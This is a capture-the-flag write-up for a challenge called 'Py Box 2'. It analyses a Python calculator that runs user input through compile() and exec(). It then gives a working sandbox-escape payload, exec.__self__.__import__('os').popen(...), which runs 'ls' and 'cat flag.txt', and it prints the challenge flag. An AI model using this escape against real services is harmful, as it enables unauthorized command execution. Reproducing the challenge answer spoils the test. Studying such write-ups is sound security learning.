# Py Box 2
> Write-up author: vreshco
## DESCRIPTION:
ehh parah! kemarin programku di hek orang, yaudah ta kasih beberapa restriksi semoga ga kena hek lagi wkwkwkwk.
## HINT:
1. exec.__self__ or compile.__self__
## STEPS:
1. Given a machine host to run via netcat and an python script.
2. Let's try to analyze the python script first.

> SCRIPT GIVEN

```py
__builtins__ = {
    "compile": compile,
    "exec": exec,
}

BLACK_LIST = []


def calculator(txt: str):
    txt = txt.replace("=", "")
    container = {}
    comp = compile(f"result={txt}", "<string>", "exec")
    exec(comp, container)
    return container.get('result')


def check(text):
    if any([i for i in BLACK_LIST if i in text]):
        return False
    return True


with open("logo", 'r') as f:
    print(f.read())

print("aplikasi aritmatika by H3X0S1337")
print("operasi yang bisa digunakan: ")
print("- perkalian '*'")
print("- pembagian '/'")
print("- pertambahan '+'")
print("- pengurangan '-'")
print("- xor '^'")
print("- modulus '%'")
print("- pangkat '**'")
print("- pembagian lantai '//'")
print("contoh pemakaian:")
print("- 1+1 maka akan menghasilkan 2")
while True:
    try:
        user_input = input("masukkan input: ")
        calc = calculator(user_input)
        print(calc)
    except KeyboardInterrupt:
        break

```

3. Based on the script, we know the vuln is at the `exec()`. It uses it to execute arbitrary code entered by the user as a string.
4. This can potentially lead to arbitrary code execution and other security issues.
5. The `calculator()` function takes the user input as a string, then compiles it using `compile()` and executes it using `exec()` to evaluate the expression and obtain the result.
6. This apparoach can be dangerous if the user input contains malicious code or exploits.
7. Based from the hint, to utilize this vuln we can use either **exec.__self__** or **compile.__self__**.
8. For this solution i'm gonna use **exec.__self__**, let's try to list the files or directories inside it.

> COMMAND

```python
exec.__self__.__import__("os").popen("ls").read()
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/227161893-4f647142-ec76-43da-a0a3-2aef0450b6c6.png)


9. Great it works! Since there's flag.txt, let's cat that out.

> COMMAND

```python
exec.__self__.__import__("os").popen("cat flag.txt").read()
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/227162279-c3ff73c1-34d3-4ef2-bd09-c0310cb9658e.png)


10. Got the flag!

## FLAG

```
TCP1P{using_another_functon__self__to_get__import__}
```
